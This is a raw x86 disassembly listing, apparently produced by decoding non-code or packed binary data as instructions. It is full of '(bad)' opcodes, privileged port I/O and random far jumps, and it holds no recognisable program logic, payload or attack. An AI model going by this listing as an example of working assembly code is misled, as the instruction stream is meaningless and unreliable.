  4217f2:	cmp    edi,DWORD PTR [ebx+0x4e]
  4217f5:	pushf  
  4217f6:	retf   0x6163
  4217f9:	mov    ecx,0x2c5ca807
  4217ff:	sub    BYTE PTR [eax-0x13899588],ch
  421805:	cmp    BYTE PTR [eax],ah
  421807:	sbb    eax,0xd367b82
  42180c:	js     0x4217d9
  42180e:	jmp    0x0:0x34
	...
  421871:	add    BYTE PTR [eax],al
  421873:	add    cl,dl
  421875:	mov    al,ds:0xf9f9e0b9
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	pop    ebx
  421881:	scas   eax,DWORD PTR es:[edi]
  421882:	fidiv  WORD PTR [edx+0x16520]
  421888:	add    al,0x1
  42188a:	add    BYTE PTR [eax],al
  42188c:	mov    cl,0x1d
  42188e:	jmp    0x21e4:0x56f38ca5
  421895:	lock imul DWORD PTR [edi+0x25bbd6ef]
  42189c:	cli    
  42189d:	ficomp WORD PTR [ebx+0x6a63d632]
  4218a3:	test   bl,bl
  4218a5:	gs push edx
  4218a7:	jle    0x421913
  4218a9:	add    BYTE PTR [edx],bl
  4218ab:	call   eax
  4218ad:	adc    DWORD PTR [ecx+0x1ae8b619],ebx
  4218b3:	shl    BYTE PTR [esi+0x34],1
  4218b6:	mov    ds:0x56b40242,al
  4218bb:	pop    ss
  4218bc:	(bad)  
  4218bd:	in     al,dx
  4218be:	loope  0x421896
  4218c0:	aaa    
  4218c1:	imul   edx,DWORD PTR [ebx+0x63],0x1dd71b38
  4218c8:	dec    eax
  4218c9:	jb     0x4218cc
  4218cb:	loope  0x421850
  4218cd:	mov    edi,0xb475d79c
  4218d2:	pop    ecx
  4218d3:	or     al,0x8c
  4218d5:	pop    eax
  4218d6:	dec    esi
  4218d7:	sti    
  4218d8:	rol    DWORD PTR [eax],1
  4218da:	call   0x9595790c
  4218df:	dec    eax
  4218e0:	sbb    al,BYTE PTR [ebx]
  4218e2:	repz rcl BYTE PTR [edi-0x559797b],cl
  4218e9:	imul   ebp,DWORD PTR [ebp-0x66],0x50
  4218ed:	test   DWORD PTR ds:0xb3e15d1a,esp
  4218f3:	sub    DWORD PTR [eax],ecx
  4218f5:	cmp    al,0x2b
  4218f7:	fistp  WORD PTR [ecx]
  4218f9:	jno    0x42187d
  4218fb:	jno    0x4218c5
  4218fd:	jl     0x421976
  4218ff:	test   eax,0xd3c794cb
  421904:	popa   
  421905:	cli    
  421906:	and    DWORD PTR [esi+eiz*8-0x2ac7b5a4],eax
  42190d:	cmc    
  42190e:	bound  esp,QWORD PTR [ebx+0x20d639c5]
  421914:	pop    ecx
  421915:	mov    BYTE PTR [ecx],0x6c
  421918:	sbb    eax,0xf3e78744
  42191d:	and    eax,0xf52e1180
  421922:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421923:	pop    edx
  421924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421925:	mov    edi,0xd505b771
  42192a:	sub    dh,BYTE PTR [eax+0x547f08e4]
  421930:	or     BYTE PTR [edx],dl
  421932:	js     0x421957
  421934:	fsubr  st(1),st
  421936:	pop    eax
  421937:	push   ecx
  421938:	sub    BYTE PTR [esi],ah
  42193a:	sub    al,0x13
  42193c:	call   0xcf7f:0xb39a2736
  421943:	sbb    bl,ch
  421945:	fistp  WORD PTR [edx+0x3170a208]
  42194b:	mov    DWORD PTR [edx+edx*8],ebp
  42194e:	and    edi,DWORD PTR [esi-0x47]
  421951:	lods   eax,DWORD PTR ds:[esi]
  421952:	and    ah,dh
  421954:	adc    al,0x8c
  421956:	inc    edx
  421957:	cmp    al,0x6b
  421959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42195a:	dec    esp
  42195b:	adc    DWORD PTR [ebp+0x50],ebx
  42195e:	into   
  42195f:	push   0x288573d0
  421964:	cdq    
  421965:	sub    bh,bl
  421967:	and    al,0x3
  421969:	add    dl,BYTE PTR ss:[eax+eax*2+0xb]
  42196e:	xchg   edi,eax
  42196f:	dec    ebx
  421970:	retf   0xc8ee
  421973:	xchg   edx,eax
  421974:	sub    eax,0xa0ac57ff
  421979:	xor    ebx,ecx
  42197b:	add    eax,0x5580420
  421980:	push   edx
  421981:	arpl   WORD PTR [esi-0x34a357ba],ax
  421987:	cs pusha 
  421989:	fst    DWORD PTR [edi+0x5829ca40]
  42198f:	fiadd  DWORD PTR [eax]
	...
  4219f1:	add    BYTE PTR [eax],al
  4219f3:	add    dh,bh
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	sub    eax,0x24c91c16
  421a05:	add    WORD PTR [eax],ax
  421a08:	add    al,0x1
  421a0a:	add    BYTE PTR [eax],al
  421a0c:	sub    ebp,esp
  421a0e:	push   ebx
  421a0f:	(bad)  
  421a10:	js     0x421a68
  421a12:	out    dx,eax
  421a13:	hlt    
  421a14:	dec    eax
  421a15:	daa    
  421a16:	jns    0x421a3b
  421a18:	dec    ecx
  421a19:	push   ds
  421a1a:	mov    ah,0xcb
  421a1c:	rcl    BYTE PTR [eax-0x5a],1
  421a1f:	int3   
  421a20:	mov    eax,ds:0xae73b2fd
  421a25:	inc    edx
  421a26:	leave  
  421a27:	cmp    al,0xa9
  421a29:	push   edx
  421a2a:	shr    BYTE PTR [ebx+0x1],cl
  421a2d:	dec    esi
  421a2e:	and    DWORD PTR [eax+ebp*2],edi
  421a31:	imul   edx,DWORD PTR [edi+0x6062e44],0x69
  421a38:	jo     0x421a30
  421a3a:	pop    ds
  421a3b:	dec    eax
  421a3c:	add    BYTE PTR [ebx],al
  421a3e:	test   al,0x4a
  421a40:	loope  0x4219f1
  421a42:	xor    DWORD PTR [ebx+0x2d],ebx
  421a45:	adc    BYTE PTR [eax],cl
  421a47:	jno    0x421a2e
  421a49:	les    edx,FWORD PTR [ebx]
  421a4b:	push   ebp
  421a4c:	cwde   
  421a4d:	xchg   DWORD PTR [eax-0x16],eax
  421a50:	ret    
  421a51:	icebp  
  421a52:	lods   al,BYTE PTR ds:[esi]
  421a53:	sbb    BYTE PTR [eax-0x721b373c],ch
  421a59:	mov    eax,0xca54a303
  421a5e:	clc    
  421a5f:	test   al,0x13
  421a61:	mov    esp,0x65f18165
  421a66:	pop    ebx
  421a67:	fldcw  WORD PTR [eax-0x40]
  421a6a:	mov    esi,0x93e07b34
  421a6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a70:	retf   
  421a71:	adc    eax,0x34efdaa1
  421a76:	mov    bl,0x21
  421a78:	sahf   
  421a79:	jmp    0x689d:0x7198b12c
  421a80:	jno    0x421ae0
  421a82:	and    al,0xca
  421a84:	aaa    
  421a85:	adc    ah,bl
  421a87:	lods   al,BYTE PTR cs:[esi]
  421a89:	cmp    eax,0x67d8c04
  421a8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a8f:	ins    DWORD PTR es:[edi],dx
  421a90:	addr16 and edi,eax
  421a93:	push   0xffffffea
  421a95:	scas   eax,DWORD PTR es:[edi]
  421a96:	xor    edx,eax
  421a98:	dec    esi
  421a99:	sar    BYTE PTR [ebx-0x458fee97],1
  421a9f:	push   esi
  421aa0:	neg    BYTE PTR [esi+0x35cc3057]
  421aa6:	jle    0x421ad8
  421aa8:	iret   
  421aa9:	shl    BYTE PTR [esi],1
  421aab:	in     al,dx
  421aac:	push   edx
  421aad:	push   eax
  421aae:	lods   al,BYTE PTR ds:[esi]
  421aaf:	leave  
  421ab0:	adc    eax,0x800cdb99
  421ab5:	xor    dx,WORD PTR [ecx-0x60]
  421ab9:	and    eax,0x3b099e83
  421abe:	sub    eax,0xe9dbfbc4
  421ac3:	scas   eax,DWORD PTR es:[edi]
  421ac4:	dec    ebp
  421ac5:	sub    ebx,DWORD PTR [edi]
  421ac7:	or     BYTE PTR [edi-0x2a],dh
  421aca:	add    edx,esi
  421acc:	xlat   BYTE PTR ds:[ebx]
  421acd:	test   DWORD PTR [edi-0x6f582145],edx
  421ad3:	mov    eax,ds:0x42704bc9
  421ad8:	mov    ds:0x9b1b59a9,eax
  421add:	mov    edi,0x95977443
  421ae2:	push   esi
  421ae3:	inc    edx
  421ae4:	xor    ah,0xd0
  421ae7:	jae    0x421b32
  421ae9:	in     eax,0xba
  421aeb:	mov    dl,0xe4
  421aed:	push   edi
  421aef:	es leave 
  421af1:	add    ch,dl
  421af3:	or     eax,0x63376994
  421af8:	adc    al,0xf1
  421afa:	adc    eax,DWORD PTR [esi]
  421afc:	or     eax,0x3a6333de
  421b01:	pop    ss
  421b02:	pop    ebp
  421b03:	ds pop ss
  421b05:	out    dx,al
  421b06:	jne    0x421b61
  421b08:	xor    ah,dh
  421b0a:	out    dx,al
  421b0b:	push   eax
  421b0c:	pop    edx
  421b0d:	imul   esp,DWORD PTR [edi+0x1],0x0
	...
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     al,BYTE PTR [edi]
  421b81:	outs   dx,DWORD PTR ds:[esi]
  421b82:	test   eax,0x1672866
  421b87:	add    BYTE PTR [ecx+eax*1],al
  421b8a:	add    BYTE PTR [eax],al
  421b8c:	ins    BYTE PTR es:[edi],dx
  421b8d:	mov    eax,0xb58ef078
  421b92:	loope  0x421b2c
  421b94:	lods   eax,DWORD PTR ds:[esi]
  421b95:	ds mov edi,0x5515b85b
  421b9b:	popa   
  421b9c:	xor    esp,0x7ab9bd8c
  421ba2:	in     al,0xd
  421ba4:	stos   DWORD PTR es:[edi],eax
  421ba5:	xor    dh,ch
  421ba7:	jge    0x421b8e
  421ba9:	scas   al,BYTE PTR es:[edi]
  421baa:	ss pop ds
  421bac:	test   al,0x71
  421bae:	jl     0x421c2a
  421bb0:	neg    BYTE PTR [ebx]
  421bb2:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bb4:	sbb    BYTE PTR [edi+ebp*1-0x7f],al
  421bb8:	xor    eax,0xe4b84217
  421bbd:	ds pushf 
  421bbf:	je     0x421bef
  421bc1:	(bad)  
  421bc2:	adc    eax,0x4729fb57
  421bc7:	imul   ah
  421bc9:	test   al,0xee
  421bcb:	std    
  421bcc:	mov    DWORD PTR [ecx+0x7f4b7549],edi
  421bd2:	cwde   
  421bd3:	shl    DWORD PTR [edi+0x5e],cl
  421bd6:	(bad)  
  421bd8:	mov    eax,0x49785334
  421bdd:	sti    
  421bde:	mov    ds:0x30b149d7,eax
  421be3:	push   0x87257978
  421be8:	xor    BYTE PTR [ecx],bl
  421bea:	stos   BYTE PTR es:[edi],al
  421beb:	ss mov dl,0xfc
  421bee:	push   eax
  421bef:	mov    bh,0x3e
  421bf1:	adc    ecx,ebp
  421bf3:	std    
  421bf4:	rcr    DWORD PTR [edx],0x42
  421bf7:	mov    ecx,0x87906bcd
  421bfc:	lea    esi,[ebx+0x44]
  421bff:	loope  0x421bd4
  421c01:	or     DWORD PTR [edx-0x1d],esi
  421c04:	rcr    BYTE PTR [edx-0x743c98d1],1
  421c0a:	out    0x39,eax
  421c0c:	push   ecx
  421c0d:	xchg   esi,eax
  421c0e:	in     eax,0x5c
  421c10:	xchg   ebx,eax
  421c11:	icebp  
  421c12:	pop    es
  421c13:	mov    al,0x49
  421c15:	sub    al,0x76
  421c17:	cmc    
  421c18:	add    BYTE PTR [esi+0x4d7acad],ah
  421c1e:	mov    WORD PTR [edi],gs
  421c20:	mov    dh,0x77
  421c22:	dec    eax
  421c23:	sub    dl,dl
  421c25:	lods   al,BYTE PTR ds:[esi]
  421c26:	sub    eax,0x9c448531
  421c2b:	sbb    ch,BYTE PTR [eax-0x21]
  421c2e:	test   ah,dl
  421c30:	lods   al,BYTE PTR ds:[esi]
  421c31:	aaa    
  421c32:	mul    DWORD PTR [eax+0x418d0765]
  421c38:	imul   ebx,DWORD PTR [eax+0x3c031a16],0xffffff89
  421c3f:	add    al,0xc5
  421c41:	dec    ebp
  421c42:	mov    BYTE PTR [ecx-0x3dea892a],ch
  421c48:	push   ds
  421c49:	mov    bl,0xd5
  421c4b:	jmp    0xfd0dfd05
  421c50:	std    
  421c51:	jmp    0x8879:0x434020b1
  421c58:	sbb    al,0xa9
  421c5a:	xchg   esi,eax
  421c5b:	pop    es
  421c5c:	xor    al,0x94
  421c5e:	addr16 mov esi,0xb49dd5ba
  421c64:	push   eax
  421c65:	mov    cl,0x98
  421c67:	sub    DWORD PTR [edi-0x490f3a17],edx
  421c6d:	jbe    0x421c80
  421c6f:	leave  
  421c70:	or     dh,BYTE PTR [ecx]
  421c72:	mov    edx,0x49b30c99
  421c77:	adc    eax,0xa3a8bbe7
  421c7c:	cli    
  421c7d:	scas   al,BYTE PTR es:[edi]
  421c7e:	rcl    eax,cl
  421c80:	repz jmp 0xcca2:0xe5fe47ca
  421c88:	(bad)  
  421c89:	xor    ah,BYTE PTR [eax+0xd5e81b3]
  421c8f:	adc    al,0x0
	...
  421cf1:	add    BYTE PTR [eax],al
  421cf3:	add    BYTE PTR [eax-0x1a4a95],dh
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	retf   0xd17d
  421d03:	outs   dx,BYTE PTR ds:[esi]
  421d04:	sub    al,0x68
  421d06:	add    DWORD PTR [eax],eax
  421d08:	add    al,0x1
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	fs jmp 0xf84cbc
  421d12:	cmp    ebx,DWORD PTR [eax-0x351fb2d1]
  421d18:	mov    ecx,0xbc507fc7
  421d1d:	xchg   esp,eax
  421d1e:	jge    0x421d25
  421d20:	loop   0x421cc9
  421d22:	out    dx,al
  421d23:	pop    es
  421d24:	out    dx,al
  421d25:	jecxz  0x421d3a
  421d27:	pop    esp
  421d28:	ja     0x421d80
  421d2a:	mov    ecx,0xc63de135
  421d2f:	and    al,0x33
  421d31:	adc    DWORD PTR [esi+0x2f5d58e7],eax
  421d37:	cs repz (bad) 
  421d3a:	ss xor al,0xa9
  421d3d:	mov    eax,0xaf01bdd1
  421d42:	sub    dl,dh
  421d44:	repz cdq 
  421d46:	mov    WORD PTR [edi],?
  421d48:	test   al,0xc3
  421d4a:	mul    BYTE PTR [eax-0x61]
  421d4d:	dec    esi
  421d4e:	or     edi,ecx
  421d50:	(bad)  
  421d51:	or     edx,ebx
  421d53:	adc    ebx,DWORD PTR [edi]
  421d55:	int    0x8f
  421d57:	lea    ebp,[esi]
  421d59:	mov    ecx,0xd55df44a
  421d5e:	inc    edi
  421d5f:	cmc    
  421d60:	xor    DWORD PTR [eax+0x1352b826],0xffffffe8
  421d67:	xchg   edi,eax
  421d68:	inc    esp
  421d69:	push   0xcafa6387
  421d6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d6f:	pushf  
  421d70:	mov    esi,0x6ebdc18a
  421d75:	cmp    eax,0xbcc0e429
  421d7a:	lea    ecx,[ebp-0x2effded2]
  421d80:	add    ah,BYTE PTR [ebp+0x6af417dc]
  421d86:	into   
  421d87:	les    edi,FWORD PTR [ebp+0x42]
  421d8a:	dec    edx
  421d8b:	dec    ebp
  421d8c:	dec    eax
  421d8d:	jne    0x421d14
  421d8f:	cmp    al,0x3f
  421d91:	add    BYTE PTR [edx+0x3d93dca7],bl
  421d97:	addr16 pop ss
  421d99:	pop    esi
  421d9a:	(bad)  
  421d9b:	pushf  
  421d9c:	and    ebx,ebx
  421d9e:	mov    ebp,0x7c61652d
  421da3:	imul   ecx,DWORD PTR [eiz*4+0x27546ed4],0xfffffff3
  421dab:	mov    BYTE PTR [edx],bh
  421dad:	repnz mov dl,0x61
  421db0:	inc    edi
  421db1:	loopne 0x421d98
  421db3:	in     eax,dx
  421db4:	add    BYTE PTR [esi+0x52],al
  421db7:	adc    cl,BYTE PTR [edi+0x78d7d13b]
  421dbd:	fldenv [ecx]
  421dbf:	sub    esi,DWORD PTR [edx-0x60]
  421dc2:	and    al,0xd2
  421dc4:	outs   dx,DWORD PTR ds:[esi]
  421dc5:	mul    BYTE PTR [ebx-0x2b00f7ca]
  421dcb:	xchg   edi,esi
  421dcd:	scas   eax,DWORD PTR es:[edi]
  421dce:	and    eax,0x610220cd
  421dd3:	jnp    0x421d6f
  421dd5:	bound  esp,QWORD PTR [edx+eax*2-0x765399fa]
  421ddc:	fwait
  421ddd:	mov    eax,0xf157ca50
  421de2:	mov    ebx,0xb8facf91
  421de7:	jmp    0xd9d4:0x4df7d7f0
  421dee:	mov    esp,0x88489316
  421df3:	(bad)  [esi]
  421df5:	mov    bl,0x4
  421df7:	dec    ecx
  421df8:	lods   eax,DWORD PTR ds:[esi]
  421df9:	bound  esp,QWORD PTR cs:[ebx-0x50]
  421dfd:	jl     0x421dde
  421dff:	out    0x6d,al
  421e01:	dec    edx
  421e02:	mov    ds:0x9192270e,eax
  421e07:	adc    BYTE PTR [ecx-0x17b98ad7],bl
  421e0d:	scas   al,BYTE PTR es:[edi]
  421e0e:	sbb    al,0x24
	...
  421e74:	iret   
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	inc    ebx
  421e81:	sub    ebx,DWORD PTR [eax+0x58]
  421e84:	xor    BYTE PTR [ecx+0x1],ch
  421e87:	add    BYTE PTR [ecx+eax*1],al
  421e8a:	add    BYTE PTR [eax],al
  421e8c:	icebp  
  421e8d:	add    eax,0x192be406
  421e92:	push   edi
  421e93:	sub    ebx,DWORD PTR [edi+0x13]
  421e96:	mov    al,ds:0xd896cb7
  421e9b:	xchg   ecx,eax
  421e9c:	sub    DWORD PTR [edx],0x13
  421e9f:	retf   0x2f0a
  421ea2:	mov    al,0xe5
  421ea4:	iret   
  421ea5:	psrlq  mm0,QWORD PTR [ebx]
  421ea8:	ins    DWORD PTR es:[edi],dx
  421ea9:	jns    0x421ed7
  421eab:	and    al,0xa1
  421ead:	or     dl,BYTE PTR [ebp-0x2f]
  421eb0:	mov    ebx,0x7e42c270
  421eb5:	arpl   WORD PTR [ebx],bp
  421eb7:	lods   al,BYTE PTR ds:[esi]
  421eb8:	jp     0x421e3f
  421eba:	dec    ebp
  421ebb:	sbb    eax,0x9ab18b16
  421ec0:	push   ss
  421ec1:	jp     0x421e7c
  421ec3:	xchg   edi,eax
  421ec4:	xchg   edi,eax
  421ec5:	dec    ebp
  421ec6:	imul   eax,DWORD PTR [edx],0x3e
  421ec9:	cmp    bl,BYTE PTR [ebp+ebx*1-0x60]
  421ecd:	les    ebp,FWORD PTR gs:[eax+eiz*4-0x6976df13]
  421ed5:	adc    eax,0x431d765
  421eda:	adc    al,0x8
  421edc:	jnp    0x421f15
  421ede:	xor    al,0x8d
  421ee0:	jbe    0x421e7f
  421ee2:	mov    bl,dh
  421ee4:	ds sti 
  421ee6:	lea    edx,[eax-0x2f]
  421ee9:	pop    ebp
  421eea:	dec    ebx
  421eeb:	je     0x421f6c
  421eed:	lea    ebp,[ebx-0x27]
  421ef0:	neg    BYTE PTR [ecx+0x6f]
  421ef3:	pop    ebp
  421ef4:	ror    DWORD PTR [ecx],0xa2
  421ef7:	cli    
  421ef8:	test   DWORD PTR [esi],ebp
  421efa:	lahf   
  421efb:	inc    eax
  421efc:	xchg   edi,eax
  421efd:	mov    ds:0x41d9a64c,al
  421f02:	dec    edx
  421f03:	out    dx,eax
  421f04:	jne    0x421f64
  421f06:	push   edx
  421f07:	arpl   WORD PTR [edx-0xa],di
  421f0a:	add    DWORD PTR [eax-0x74],esp
  421f0d:	jg     0x421f20
  421f0f:	jge    0x421f25
  421f11:	sbb    al,0x15
  421f13:	inc    esi
  421f14:	je     0x421f2d
  421f16:	adc    BYTE PTR [edi],dl
  421f18:	pusha  
  421f19:	mov    bl,0x76
  421f1b:	and    BYTE PTR [esi+0x295c43ac],dl
  421f21:	sub    eax,0x273d2d32
  421f26:	or     BYTE PTR [edi],ch
  421f28:	sbb    esi,DWORD PTR [eax+0x4b]
  421f2b:	into   
  421f2c:	adc    al,0x8
  421f2e:	sbb    DWORD PTR [edx+0x19],0xffffff9a
  421f32:	add    eax,0x787d9fe6
  421f37:	and    BYTE PTR [esp+eiz*2-0x1b],0x94
  421f3c:	test   al,0xcd
  421f3e:	js     0x421fa6
  421f40:	sar    esi,0x46
  421f43:	xchg   esi,eax
  421f44:	loope  0x421f88
  421f46:	pop    edi
  421f47:	pop    edi
  421f48:	test   BYTE PTR [ebx+0x3b588377],bh
  421f4e:	(bad)  
  421f4f:	dec    esi
  421f50:	out    0x7d,eax
  421f52:	push   esp
  421f53:	sahf   
  421f54:	push   ecx
  421f55:	loop   0x421f6c
  421f57:	dec    eax
  421f58:	sub    al,0x72
  421f5a:	shl    DWORD PTR [esp+ebp*4+0x6a],0x6
  421f5f:	repz push ds
  421f61:	repz (bad) 
  421f63:	or     DWORD PTR ds:0x3bb018ed,esp
  421f69:	cmp    al,0x70
  421f6b:	outs   dx,DWORD PTR ds:[esi]
  421f6c:	es scas al,BYTE PTR es:[edi]
  421f6e:	push   esi
  421f6f:	mov    WORD PTR [ebp-0x3f3100a1],es
  421f75:	mov    eax,ds:0xdcb5aa66
  421f7a:	aad    0xef
  421f7c:	pop    eax
  421f7d:	dec    ecx
  421f7e:	push   eax
  421f7f:	fwait
  421f80:	in     eax,0xaa
  421f82:	fs jnp 0x421f13
  421f85:	push   es
  421f86:	enter  0x3bab,0x7a
  421f8a:	mov    ebp,0xb815bbf3
  421f8f:	push   ds
	...
  421ff4:	imul   eax,DWORD PTR [esi],0xffffff8f
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	data16 mov al,0x4b
  422002:	jae    0x421ffd
  422004:	xor    al,0x6a
  422006:	add    DWORD PTR [eax],eax
  422008:	add    al,0x1
  42200a:	add    BYTE PTR [eax],al
  42200c:	sub    BYTE PTR [edi],dh
  42200e:	ret    
  42200f:	cld    
  422010:	aas    
  422011:	lock jle 0x422000
  422014:	xor    eax,0x6aa1933b
  422019:	pop    ebp
  42201a:	inc    esp
  42201b:	mov    bl,0x25
  42201d:	out    dx,eax
  42201e:	sbb    DWORD PTR [edi+ebp*1-0x29],esi
  422022:	in     al,dx
  422023:	loopne 0x42206a
  422025:	rcl    DWORD PTR [edi-0x717034fb],0xa4
  42202c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42202d:	pop    edi
  42202e:	pop    edx
  42202f:	xchg   DWORD PTR [ebp+ebp*2+0xd],esp
  422033:	fdivr  DWORD PTR [edx]
  422035:	or     DWORD PTR [edx-0x65],0x68afab96
  42203c:	(bad)  
  42203d:	push   eax
  42203e:	add    BYTE PTR [ebp+0xd],dh
  422041:	mov    BYTE PTR [eax],bh
  422043:	jl     0x42208e
  422045:	(bad)  [ecx+edx*1-0x483d3277]
  42204c:	xchg   DWORD PTR [edx-0x3581db5d],edi
  422052:	pop    ss
  422053:	lahf   
  422054:	dec    esp
  422055:	outs   dx,BYTE PTR ds:[esi]
  422056:	dec    esi
  422057:	add    eax,0x13fd6e2e
  42205c:	out    0xcf,al
  42205e:	ret    
  42205f:	dec    edx
  422060:	dec    esp
  422061:	sub    eax,DWORD PTR [eax-0x5b]
  422064:	jo     0x422013
  422066:	mov    bl,0x45
  422068:	mov    ds:0x66b9d40c,eax
  42206d:	pop    esi
  42206e:	sbb    BYTE PTR [edi],cl
  422070:	mov    ah,0x7d
  422072:	and    DWORD PTR [esi],edx
  422074:	push   ecx
  422075:	jno    0x4220c1
  422077:	loopne 0x42200b
  422079:	and    eax,0x59fcf8e5
  42207e:	in     eax,dx
  42207f:	cmp    DWORD PTR [ecx-0x1f],esi
  422082:	xchg   esp,eax
  422083:	push   edx
  422084:	pop    esi
  422085:	push   0x44
  422087:	mov    esi,DWORD PTR [esi+0x27]
  42208a:	or     BYTE PTR [ebx+0xc],ch
  42208d:	or     BYTE PTR [edx],0xcf
  422090:	add    ah,bl
  422092:	add    esp,DWORD PTR [ecx+0x2100c15b]
  422098:	into   
  422099:	out    0xc4,eax
  42209b:	cwde   
  42209c:	je     0x422052
  42209e:	scas   eax,DWORD PTR es:[edi]
  42209f:	jmp    0x42206c
  4220a1:	add    al,0x20
  4220a3:	jmp    0xa94353c0
  4220a8:	es icebp 
  4220aa:	ins    BYTE PTR es:[edi],dx
  4220ab:	push   edi
  4220ac:	mov    esp,0x783524d3
  4220b1:	jg     0x4220b2
  4220b3:	mov    al,ds:0xc4a438e5
  4220b8:	push   ds
  4220b9:	loope  0x4220c6
  4220bb:	int3   
  4220bc:	mov    al,0x66
  4220be:	sub    al,0x83
  4220c0:	fistp  DWORD PTR [ecx]
  4220c2:	shl    DWORD PTR [edi+0x43],0xd8
  4220c6:	outs   dx,BYTE PTR ds:[esi]
  4220c7:	daa    
  4220c8:	inc    edx
  4220c9:	push   ebp
  4220ca:	fsubrp st(2),st
  4220cc:	fmul   QWORD PTR [esi-0x53056c5]
  4220d2:	xchg   ebx,eax
  4220d3:	xchg   esi,eax
  4220d4:	test   al,0x13
  4220d6:	stos   DWORD PTR es:[edi],eax
  4220d7:	jg     0x42213e
  4220d9:	jno    0x4220ef
  4220db:	sub    esp,eax
  4220dd:	xor    DWORD PTR [ecx+0x2d],eax
  4220e0:	mov    edx,0x71808758
  4220e5:	rcr    DWORD PTR [esi+0x6d],0x20
  4220e9:	jne    0x4220a9
  4220eb:	pushf  
  4220ec:	or     esi,DWORD PTR [ebx+0x35e31740]
  4220f2:	inc    esp
  4220f3:	fdiv   QWORD PTR [ebx]
  4220f5:	sbb    DWORD PTR [edi],esi
  4220f7:	call   0x9213:0xb876ed28
  4220fe:	bound  edi,QWORD PTR [edi+eax*2+0x24d6d103]
  422105:	loop   0x4220b6
  422107:	es sahf 
  422109:	cmp    al,BYTE PTR [ebx]
  42210b:	cmp    eax,0x895385f4
	...
  422174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422175:	push   edx
  422176:	jnp    0x422175
  422178:	(bad)  
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    ebp,DWORD PTR [ecx+0x38e966ae]
  422185:	imul   eax,DWORD PTR [ecx],0x0
  422188:	add    al,0x1
  42218a:	add    BYTE PTR [eax],al
  42218c:	sbb    ch,bh
  42218e:	push   eax
  42218f:	xlat   BYTE PTR ds:[ebx]
  422190:	dec    edi
  422191:	jge    0x4221d3
  422193:	and    ch,bl
  422195:	clc    
  422196:	add    DWORD PTR [ebp-0x61],ecx
  422199:	jbe    0x42218e
  42219b:	pop    ecx
  42219c:	dec    ecx
  42219d:	xchg   edx,eax
  42219e:	das    
  42219f:	inc    edi
  4221a0:	sub    esp,eax
  4221a2:	adc    eax,0x716d0800
  4221a7:	js     0x42217e
  4221a9:	ins    BYTE PTR es:[edi],dx
  4221aa:	pop    eax
  4221ab:	outs   dx,DWORD PTR ds:[esi]
  4221ac:	clc    
  4221ad:	adc    al,0xcd
  4221af:	retf   0x4044
  4221b2:	and    ch,BYTE PTR [edx-0x39320896]
  4221b8:	(bad)  
  4221b9:	test   eax,0x8dfdcc30
  4221be:	xchg   edx,eax
  4221bf:	xor    eax,0x1a6e91de
  4221c4:	jmp    0x97a10e50
  4221c9:	xor    eax,0x4dc17376
  4221ce:	add    eax,DWORD PTR [esi]
  4221d0:	mov    dh,0x9f
  4221d2:	imul   edx,DWORD PTR [eax-0x132b32d2],0x3c
  4221d9:	xor    ch,BYTE PTR [eax-0x2e]
  4221dc:	mov    ecx,0x14351b9a
  4221e1:	adc    eax,0x1e0a139a
  4221e6:	out    0x1f,al
  4221e8:	cmp    ebx,0x21f6a058
  4221ee:	xchg   ebp,eax
  4221ef:	inc    esp
  4221f0:	cmp    ecx,DWORD PTR [ecx]
  4221f2:	and    DWORD PTR es:[edi+0x2d],0xffffffa2
  4221f7:	ja     0x422235
  4221f9:	mov    BYTE PTR [ebp+0x59],cl
  4221fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221fd:	pusha  
  4221fe:	push   ecx
  4221ff:	mov    dl,0x30
  422201:	mov    bh,BYTE PTR [edx]
  422203:	pop    ds
  422204:	scas   eax,DWORD PTR es:[edi]
  422205:	sti    
  422206:	xor    edi,esp
  422208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422209:	cmp    DWORD PTR [edi+ecx*8-0x22417e78],eax
  422210:	mov    al,ds:0xa7d524d7
  422215:	xchg   edi,eax
  422216:	mov    ah,0x7d
  422218:	ror    DWORD PTR [ebp-0x6d58f3c5],0xe6
  42221f:	push   ebp
  422220:	(bad)  
  422221:	in     eax,0xb4
  422223:	cmp    cl,BYTE PTR [eax]
  422225:	dec    esi
  422226:	stos   BYTE PTR es:[edi],al
  422227:	mov    bl,0x11
  422229:	push   esi
  42222a:	lods   eax,DWORD PTR ds:[esi]
  42222b:	add    al,0x1f
  42222d:	and    BYTE PTR cs:[edx+0x37],bh
  422231:	sbb    BYTE PTR [ebp+0x262f31ac],0xef
  422238:	test   esi,esi
  42223a:	add    eax,0xeca94232
  42223f:	pop    eax
  422240:	lock dec esi
  422242:	add    ebx,0x9ba6516e
  422248:	pop    esp
  422249:	(bad)  
  42224a:	retf   
  42224b:	sub    eax,0x3f036cb5
  422250:	(bad)  
  422251:	outs   dx,BYTE PTR ds:[esi]
